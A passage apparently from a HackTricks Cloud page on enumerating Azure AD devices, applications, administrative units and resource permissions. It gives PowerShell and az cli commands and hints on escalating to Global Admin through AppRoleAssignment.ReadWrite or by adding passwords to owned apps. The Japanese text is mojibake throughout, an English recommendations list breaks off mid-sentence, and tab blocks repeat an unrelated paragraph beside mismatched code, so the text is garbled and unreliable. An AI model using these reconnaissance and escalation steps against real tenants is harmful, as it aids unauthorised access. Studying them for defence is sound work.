- **Recommendation**: Review and customize security defaults settings to align with organizational security requirements.

### Sign-In Logs Enumeration

- **Description**: Azure AD sign-in logs enumeration can help track and analyze sign-in activities in the directory.
- **Detection**: Monitor for suspicious sign-in events that may indicate unauthorized access.
- **Recommendation**: Regularly review sign-in logs for anomalies and investigate any suspicious activities promptly.

### Conditional Access Enumeration

- **Description**: Azure AD conditional access enumeration can reveal information about configured conditional access policies.
- **Detection**: Monitor for changes to conditional access policies that may indicate unauthorized access attempts.
- **Recommendation**: Regularly review and update conditional access policies to enforce access controls and security measures effectively.

### Identity Protection Enumeration

- **Description**: Azure AD Identity Protection enumeration can provide insights into risk detections and vulnerabilities identified by Azure AD Identity Protection.
- **Detection**: Monitor for risk detections and vulnerabilities identified by Azure AD Identity Protection that may require immediate action.
- **Recommendation**: Respond promptly to risk detections and vulnerabilities identified by Azure AD Identity Protection to mitigate potential security risks.

### B2B Guest Enumeration

- **Description**: Azure AD B2B guest enumeration can help identify external users invited to the directory as guests.
- **Detection**: Monitor for unusual guest activities that may indicate unauthorized access or misuse.
- **Recommendation**: Regularly review and manage B2B guest access to prevent unauthorized access and data leakage.

### Legacy Authentication Enumeration

- **Description**: Azure AD legacy authentication enumeration can help identify authentication attempts using legacy protocols.
- **Detection**: Monitor for legacy authentication events that may pose security risks due to outdated authentication mechanisms.
- **Recommendation**: Disable legacy authentication protocols and encourage the use of modern authentication methods to enhance security.

### Risky Users Enumeration

- **Description**: Azure AD risky users enumeration can help identify users with risky behavior or compromised credentials.
- **Detection**: Monitor for risky user activities and investigate further to determine the extent of the risk.
- **Recommendation**: Take immediate action to secure accounts of risky
```powershell
# Get permissions over a resource using ARM directly
$Token = (Get-AzAccessToken).Token
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```
### ãƒ‡ãƒã‚¤ã‚¹

{% tabs %}
{% tab title="az cli" %}
```bash
# If you know how to do this send a PR!
```
{% endtab %}

{% tab title="Azure AD" %}

Azure ADã¸ã®ä¾µå…¥ã¯ã€å¤šãã®å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®èªè¨¼æƒ…å ±ã‚’ç›—ã‚€ã“ã¨ã‹ã‚‰å§‹ã¾ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°æ”»æ’ƒã€ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ãƒªãƒ³ã‚°ã€ã¾ãŸã¯æ—¢çŸ¥ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦é”æˆã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ä¾µå…¥ã—ãŸå¾Œã¯ã€æ¨©é™æ˜‡æ ¼ã€ãƒ‡ãƒ¼ã‚¿ã®çªƒå–ã€ã¾ãŸã¯ä»–ã®Azureã‚µãƒ¼ãƒ“ã‚¹ã¸ã®é€²å±•ãªã©ã€ã•ã¾ã–ã¾ãªæ‚ªæ„ã‚ã‚‹æ´»å‹•ãŒè¡Œã‚ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚{% endtab %}
```powershell
# Enumerate Devices
Get-AzureADDevice -All $true | fl *
# List all the active devices (and not the stale devices)
Get-AzureADDevice -All $true | ?{$_.ApproximateLastLogonTimeStamp -ne $null}
# Get owners of all devices
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredOwner -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}
# Registred users of all the devices
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredUser -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}
# Get dives managed using Intune
Get-AzureADDevice -All $true | ?{$_.IsCompliant -eq "True"}
# Get devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Get Administrative Units of a device
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -ObjectId $_.ObjectId | where {$_.ObjectId -eq $deviceObjId} }
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
ãƒ‡ãƒã‚¤ã‚¹ï¼ˆVMï¼‰ãŒ**AzureADã«å‚åŠ **ã—ã¦ã„ã‚‹å ´åˆã€AzureADã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯**ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹**ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚\
ã•ã‚‰ã«ã€ãƒ­ã‚°ã‚¤ãƒ³ã—ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ‡ãƒã‚¤ã‚¹ã®**æ‰€æœ‰è€…**ã§ã‚ã‚‹å ´åˆã€å½¼ã¯**ãƒ­ãƒ¼ã‚«ãƒ«ç®¡ç†è€…**ã«ãªã‚Šã¾ã™ã€‚
{% endhint %}

### ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³

{% hint style="info" %}
**ã‚¢ãƒ—ãƒª**ã¯ãƒãƒ¼ã‚¿ãƒ«å†…ã®**App Registrations**ã§ã™ï¼ˆã‚¨ãƒ³ã‚¿ãƒ¼ãƒ—ãƒ©ã‚¤ã‚ºã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã¯ã‚ã‚Šã¾ã›ã‚“ï¼‰ã€‚\
ãŸã ã—ã€å„App Registrationã¯åŒã˜åå‰ã®**ã‚¨ãƒ³ã‚¿ãƒ¼ãƒ—ãƒ©ã‚¤ã‚ºã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³**ï¼ˆ**ã‚µãƒ¼ãƒ“ã‚¹ ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«**ï¼‰ã‚’ä½œæˆã—ã¾ã™ã€‚\
ã•ã‚‰ã«ã€ã‚¢ãƒ—ãƒªãŒ**ãƒãƒ«ãƒãƒ†ãƒŠãƒ³ãƒˆ ã‚¢ãƒ—ãƒª**ã§ã‚ã‚‹å ´åˆã€**åˆ¥ã®**ã‚¨ãƒ³ã‚¿ãƒ¼ãƒ—ãƒ©ã‚¤ã‚º ã‚¢ãƒ—ãƒªï¼ˆ**ã‚µãƒ¼ãƒ“ã‚¹ ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«**ï¼‰ãŒ**ãã®ãƒ†ãƒŠãƒ³ãƒˆ**ã«åŒã˜åå‰ã§ä½œæˆã•ã‚Œã¾ã™ã€‚
{% endhint %}

ã‚¢ãƒ—ãƒªãŒç”Ÿæˆã•ã‚Œã‚‹ã¨ã€2ç¨®é¡ã®ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ãŒä¸ãˆã‚‰ã‚Œã¾ã™ï¼š

- **ã‚µãƒ¼ãƒ“ã‚¹ ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«**ã«ä¸ãˆã‚‰ã‚Œã‚‹**ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯**
- **ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä»£è¡¨ã—ã¦**ã‚¢ãƒ—ãƒªãŒæŒã¡ã€ä½¿ç”¨ã§ãã‚‹**ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯**ã€‚
```bash
# List Apps
az ad app list
az ad app list --query "[].[displayName]" -o table
# Get info of 1 App
az ad app show --id 00000000-0000-0000-0000-000000000000
# Search App by string
az ad app list --query "[?contains(displayName,'app')].displayName"
# Get the owner of an application
az ad app owner list --id <id> --query "[].[displayName]" -o table
# List all the apps with an application password
az ad app list --query "[?passwordCredentials != null].displayName"
# List apps that have key credentials (use of certificate authentication)
az ad app list --query "[?keyCredentials != null].displayName"
```
{% endtab %}

{% tab title="Azure AD" %}

Azure ADã¸ã®ä¾µå…¥ã¯ã€å¤šãã®å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®èªè¨¼æƒ…å ±ã‚’ç›—ã‚€ã“ã¨ã‹ã‚‰å§‹ã¾ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°æ”»æ’ƒã€ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ãƒªãƒ³ã‚°ã€ã¾ãŸã¯æ—¢çŸ¥ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦é”æˆã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ä¾µå…¥ã—ãŸå¾Œã¯ã€æ¨©é™æ˜‡æ ¼ã€ãƒ‡ãƒ¼ã‚¿ã®çªƒå–ã€ã¾ãŸã¯ä»–ã®Azureã‚µãƒ¼ãƒ“ã‚¹ã¸ã®é€²å±•ãªã©ã€ã•ã¾ã–ã¾ãªæ‚ªæ„ã‚ã‚‹æ´»å‹•ãŒè¡Œã‚ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚{% endtab %}
```powershell
# List all registered applications
Get-AzureADApplication -All $true
# Get details of an application
Get-AzureADApplication -ObjectId <id>  | fl *
# List all the apps with an application password
Get-AzureADApplication -All $true | %{if(Get-AzureADApplicationPasswordCredential -ObjectID $_.ObjectID){$_}}
# Get owner of an application
Get-AzureADApplication -ObjectId <id> | Get-AzureADApplicationOwner |fl *
```
{% endtab %}

{% tab title="Az PowerShell" %}Azure ADã¸ã®æ¥ç¶šã«ã¯ã€Azãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚Azãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€Azure ADã«å¯¾ã—ã¦PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚ä»¥ä¸‹ã¯ã€Azãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦Azure ADã«æ¥ç¶šã™ã‚‹æ–¹æ³•ã®ä¾‹ã§ã™ã€‚

```powershell
Connect-AzAccount
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€Azure ADã«æ¥ç¶šã™ã‚‹ãŸã‚ã®ãƒ­ã‚°ã‚¤ãƒ³ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚ãƒ­ã‚°ã‚¤ãƒ³æƒ…å ±ã‚’å…¥åŠ›ã—ã¦Azure ADã«ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚{% endtab %}
```powershell
# Get Apps
Get-AzADApplication
# Get details of one App
Get-AzADApplication -ObjectId <id>
# Get App searching by string
Get-AzADApplication | ?{$_.DisplayName -match "app"}
# Get Apps with password
Get-AzADAppCredential
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
**`AppRoleAssignment.ReadWrite`** ã®æ¨©é™ã‚’æŒã¤ã‚¢ãƒ—ãƒªã¯ã€è‡ªèº«ã«å½¹å‰²ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ã§ **Global Admin ã«æ˜‡æ ¼** ã§ãã¾ã™ã€‚\
è©³ç´°ã¯[**ã“ã¡ã‚‰ã‚’ãƒã‚§ãƒƒã‚¯**](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48)ã€‚
{% endhint %}

{% hint style="info" %}
ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã™ã‚‹éš›ã«è‡ªèº«ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’è¨¼æ˜ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ç§˜å¯†æ–‡å­—åˆ—ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ã™ã€‚\
ã—ãŸãŒã£ã¦ã€ã“ã® **ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰** ã‚’è¦‹ã¤ã‘ã‚‹ã¨ã€**ãƒ†ãƒŠãƒ³ãƒˆå†…ã®ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¨ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹** ã§ãã¾ã™ã€‚\
ã“ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯ç”Ÿæˆæ™‚ã«ã®ã¿è¡¨ç¤ºã•ã‚Œã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ï¼ˆå¤‰æ›´ã§ãã¾ã™ãŒã€å†åº¦å–å¾—ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ï¼‰ã€‚\
**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³** ã® **æ‰€æœ‰è€…** ã¯ã€ãã‚Œã« **ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’è¿½åŠ ** ã§ãã¾ã™ï¼ˆãã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å½è£…ã§ãã¾ã™ï¼‰ã€‚\
ã“ã‚Œã‚‰ã®ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¨ã—ã¦ã®ãƒ­ã‚°ã‚¤ãƒ³ã¯ **ãƒªã‚¹ã‚¯ãŒé«˜ã„ã¨ãƒãƒ¼ã‚¯ã•ã‚Œãšã€MFA ãŒãªã„** ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

### ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¨ï¼ˆã‚¨ãƒ³ã‚¿ãƒ¼ãƒ—ãƒ©ã‚¤ã‚ºã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¾ãŸã¯ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ï¼‰ã®é•ã„

Azure ã«ãŠã‘ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¨ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã®é•ã„ï¼š

* **ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³/ã‚¢ãƒ—ãƒªç™»éŒ²**: Azure AD ã«å­˜åœ¨ã™ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã™
* `(Get-AzureADApplication -filter "DisplayName eq 'testapp'")`
* **ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«/ã‚¨ãƒ³ã‚¿ãƒ¼ãƒ—ãƒ©ã‚¤ã‚ºã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³**: Azure AD ã«ãŠã‘ã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã§ã€Azure ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã® **ç‰¹æ¨©** ã‚’æŒã¡ã€ã‚ãªãŸã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¾ãŸã¯ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒªãƒ³ã‚¯ã•ã‚Œã¦ã„ã¾ã™
* `Get-AzureADServicePrincipal -filter "DisplayName eq 'testapp'")`
* ç®¡ç†è€…ã¯ã€éå¸¸ã«æ©Ÿå¯†æ€§ã®é«˜ã„æ¨©é™ã‚’ä¸ãˆã‚‹å ´åˆã¯ã€ãã®æ¨©é™ã‚’æ‰¿èªã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ **ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ãƒ†ãƒŠãƒ³ãƒˆ** ã‚’å®Ÿè¡Œã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€ãã‚Œã‚’ä½¿ç”¨ã—å§‹ã‚ã¦ã‚¢ã‚¯ã‚»ã‚¹ã‚’ä¸ãˆã‚‹ã¨ã€å¿…è¦ãªæƒ…å ±ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ã‚ãªãŸã®ãƒ†ãƒŠãƒ³ãƒˆã« **ã‚¨ãƒ³ã‚¿ãƒ¼ãƒ—ãƒ©ã‚¤ã‚ºã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³/ã‚µãƒ¼ãƒ“ã‚¹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ãŒä½œæˆ** ã•ã‚Œã¾ã™ï¼š

### ç®¡ç†å˜ä½

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ç®¡ç†ã‚’ã‚ˆã‚ŠåŠ¹æœçš„ã«è¡Œã†ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ç®¡ç†å˜ä½ã¯ã€çµ„ç¹”å†…ã®ä»»æ„ã®éƒ¨åˆ†ã«å¯¾ã™ã‚‹å½¹å‰²ã®æ¨©é™ã‚’åˆ¶é™ã—ã¾ã™ã€‚ãŸã¨ãˆã°ã€ç®¡ç†å˜ä½ã‚’ä½¿ç”¨ã—ã¦ [Helpdesk Administrator](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#helpdesk-administrator) å½¹å‰²ã‚’åœ°åŸŸã‚µãƒãƒ¼ãƒˆã‚¹ãƒšã‚·ãƒ£ãƒªã‚¹ãƒˆã«å§”ä»»ã—ã€å½¼ã‚‰ãŒã‚µãƒãƒ¼ãƒˆã™ã‚‹åœ°åŸŸã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã¿ã‚’ç®¡ç†ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ç®¡ç†è€…å˜ä½ã«å½¹å‰²ã‚’å‰²ã‚Šå½“ã¦ã‚‹ã“ã¨ãŒã§ãã€ãã®ãƒ¡ãƒ³ãƒãƒ¼ã¯ã“ã®å½¹å‰²ã‚’æŒã¤ã“ã¨ã«ãªã‚Šã¾ã™ã€‚
```
```
{% endtab %}

{% ã‚¿ãƒ–ã®ã‚¿ã‚¤ãƒˆãƒ«="AzureAD" %}
```powershell
# Get Administrative Units
Get-AzureADMSAdministrativeUnit
Get-AzureADMSAdministrativeUnit -Id <id>
# Get ID of admin unit by string
$adminUnitObj = Get-AzureADMSAdministrativeUnit -Filter "displayname eq 'Test administrative unit 2'"
# List the users, groups, and devices affected by the administrative unit
Get-AzureADMSAdministrativeUnitMember -Id <id>
# Get the roles users have over the members of the AU
Get-AzureADMSScopedRoleMembership -Id <id> | fl #Get role ID and role members
```
{% endtab %}
{% endtabs %}

## Azure AD Identity Protection (AIP) <a href="#title-text" id="title-text"></a>

Azure AD Identity Protection (AIP)ã¯ã€**è‡ªå‹•æ¤œå‡ºã¨æ˜¯æ­£ã‚’ä½¿ç”¨ã—ã¦ã€Azure Active Directoryå†…ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚’ä¿è­·ã™ã‚‹ã®ã«å½¹ç«‹ã¤ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚µãƒ¼ãƒ“ã‚¹**ã§ã™ã€‚AIPã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã‚„ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£æ§‹æˆã®ãƒªã‚¹ã‚¯ã‚’ç¶™ç¶šçš„ã«ç›£è¦–ã—ã€**é©åˆ‡ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚’è‡ªå‹•çš„ã«é©ç”¨**ã—ã¦ã€å¤šè¦ç´ èªè¨¼ã®è¦æ±‚ã‚„æ½œåœ¨çš„ã«å±é™ºãªã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã®ãƒ–ãƒ­ãƒƒã‚¯ãªã©ã‚’è¡Œã„ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€çµ„ç¹”ã¯ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã«åŸºã¥ãã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¾µå®³ã‚’é˜²ãã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚

ãƒ•ãƒ­ãƒ¼ï¼š

1. Azure AD Identity Protectionã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã‚’ç›£è¦–ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã€èªè¨¼**ã‚¤ãƒ™ãƒ³ãƒˆãªã©ã®ãƒ‡ãƒ¼ã‚¿ã‚’åé›†ã—ã¾ã™ã€‚
2. ã‚µãƒ¼ãƒ“ã‚¹ã¯ã€ã“ã®ãƒ‡ãƒ¼ã‚¿ã‚’åˆ†æã—ã€æ½œåœ¨çš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è„…å¨ã‚’æ¤œå‡ºã™ã‚‹ãŸã‚ã«**æ©Ÿæ¢°å­¦ç¿’**ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
3. Azure AD Identity Protectionã¯ã€è„…å¨ï¼ˆãŸã¨ãˆã°ã€ã‚µã‚¤ãƒ³ã‚¤ãƒ³ï¼‰ã«**ãƒªã‚¹ã‚¯ãƒ¬ãƒ™ãƒ«ã‚’å‰²ã‚Šå½“ã¦**ã—ã€å¿…è¦ã«å¿œã˜ã¦ã‚¢ãƒ©ãƒ¼ãƒˆã‚’ç”Ÿæˆã—ã¦è‡ªå‹•ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

## Azure AD Password Protection (APP)

Azure AD Password Protection (APP)ã¯ã€Azure Active Directoryå†…ã®å¼±ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’é˜²ãã®ã«å½¹ç«‹ã¤ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ©Ÿèƒ½ã§ã‚ã‚Šã€**å¼·åŠ›ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒªã‚·ãƒ¼ã‚’å¼·åˆ¶ã™ã‚‹ã“ã¨**ã«ã‚ˆã‚Šã€**ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã‚‹å¼±ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ãŠã‚ˆã³ãã®ãƒãƒªã‚¢ãƒ³ãƒˆã‚’ãƒ–ãƒ­ãƒƒã‚¯ã—ã¦ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰é–¢é€£ã®ä¾µå®³ã®ãƒªã‚¹ã‚¯ã‚’ä½æ¸›ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ¬ãƒ™ãƒ«ã¨ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹ã®Active Directoryã®ä¸¡æ–¹ã§é©ç”¨ã§ãã€çµ„ç¹”å…¨ä½“ã§ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å‘ä¸Šã•ã›ã¾ã™ã€‚

### å‚è€ƒ

* [https://learn.microsoft.com/en-us/azure/active-directory/roles/administrative-units](https://learn.microsoft.com/en-us/azure/active-directory/roles/administrative-units)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
